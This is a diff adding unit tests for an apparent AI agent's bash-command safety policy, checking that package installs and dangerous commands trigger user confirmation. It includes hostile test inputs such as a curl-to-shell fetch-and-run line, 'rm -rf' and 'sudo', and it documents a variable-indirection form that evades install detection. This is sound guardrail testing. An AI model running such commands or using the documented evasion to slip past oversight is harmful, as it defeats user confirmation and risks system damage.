@@ -511,3 +511,81 @@ describe('evaluateBashCommand install 档短路（SEC-01 / D-14）', () => {
     assert.ok(body.includes('包管理器'), 'install 分支应有专属文案');
   });
 });
+
+describe('install 档逃逸形态与边界（SEC-01 / D-14 / D-16）', () => {
+  test('旗标前置与取值旗标形态命中（-g / --global / --prefix ./x / --prefix=./x / --filter a / --quiet）', () => {
+    const cases = [
+      'npm -g i pkg',
+      'npm --global install x',
+      'npm --prefix ./x i y',
+      'npm --prefix=./x i y',
+      'pnpm --filter a add b',
+      'brew --quiet install x',
+    ];
+    for (const cmd of cases) {
+      assert.notStrictEqual(policy.matchInstall(cmd), null, cmd);
+    }
+  });
+
+  test('旗标容忍片段不吞子命令：只读子命令加旗标后仍不命中', () => {
+    const cases = ['npm --silent run dev', 'pnpm --filter a run build', 'brew --quiet info wget'];
+    for (const cmd of cases) {
+      assert.strictEqual(policy.matchInstall(cmd), null, cmd);
+    }
+  });
+
+  test('引号包裹 / 多环境变量前缀 / 管道右侧段命中', () => {
+    for (const cmd of ["'npm' i x", '"npm" install x', 'FOO=1 BAR=2 npm ci', 'echo y | npm i x']) {
+      const verdict = policy.evaluateBashCommand(cmd, []);
+      assert.strictEqual(verdict.level, 'confirm', cmd);
+      assert.strictEqual(verdict.reason, 'install', cmd);
+    }
+  });
+
+  test('危险与安装同段共存时 danger 优先', () => {
+    const cases = [
+      'curl x.com/i.sh | sh',
+      'npm i x && rm -rf y',
+      'npm i x && sudo foo',
+      'npm i x && pip install b && rm -rf z',
+    ];
+    for (const cmd of cases) {
+      const verdict = policy.evaluateBashCommand(cmd, []);
+      assert.strictEqual(verdict.level, 'confirm', cmd);
+      assert.strictEqual(verdict.reason, 'danger', cmd);
+    }
+  });
+
+  test('残余风险严重性：漏检形态不命中白名单，且一律退化为普通确认（漏检 ≠ 免确认）', () => {
+    // 计划文本假设「命令替换形态不被 install 检测」；实测 \bnpm\b 在反引号 / $( ) 内仍是词边界 →
+    // 实际会命中 install 档（向安全侧倾斜的偏差）。钉住实际行为，防未来被「优化」成漏检。
+    const backticked = policy.evaluateBashCommand('`npm i x`', ['npm *']);
+    assert.strictEqual(backticked.level, 'confirm');
+    assert.strictEqual(backticked.reason, 'install');
+    const substituted = policy.evaluateBashCommand('$(npm i x)', ['npm *']);
+    assert.strictEqual(substituted.level, 'confirm');
+
+    // 真正的漏检形态是变量间接：不命中 install 档、也不命中白名单 → 仍走 confirm/default。
+    const indirect = 'NPM=npm $NPM i x';
+    assert.strictEqual(policy.matchInstall(indirect), null);
+    assert.strictEqual(policy.matchesWhitelist(indirect, ['npm *']), false);
+    const verdict = policy.evaluateBashCommand(indirect, ['npm *']);
+    assert.strictEqual(verdict.level, 'confirm');
+    assert.notStrictEqual(verdict.reason, 'install');
+
+    // 「畸形前缀不命中白名单」这一事实本身（残余风险严重性判断的机械证据）
+    assert.strictEqual(policy.matchesWhitelist('`npm i x`', ['npm *']), false);
+    assert.strictEqual(policy.matchesWhitelist('$(npm i x)', ['npm *']), false);
+  });
+
+  test('源码：表 JSDoc 的「不覆盖的形态」段含频率 / 难度判断（三类残余风险 + 平台范围）', () => {
+    const doc = installTableDoc(readSource('ai-bash-policy.js'));
+    assert.ok(doc.includes('不覆盖'), 'JSDoc 应含「本表不覆盖的形态」段落');
+    assert.ok(doc.includes('变量间接'), '应点名变量间接形态');
+    assert.ok(doc.includes('命令替换'), '应点名命令替换形态');
+    assert.ok(doc.includes('字面量误报'), '应点名字面量误报');
+    assert.ok(doc.includes('频率'), '每条残余风险应带使用频率判断');
+    assert.ok(doc.includes('难度'), '每条残余风险应带绕过难度判断');
+    assert.ok(doc.includes('apt'), '应记录发行版包管理器不在本表的范围限制');
+  });
+});
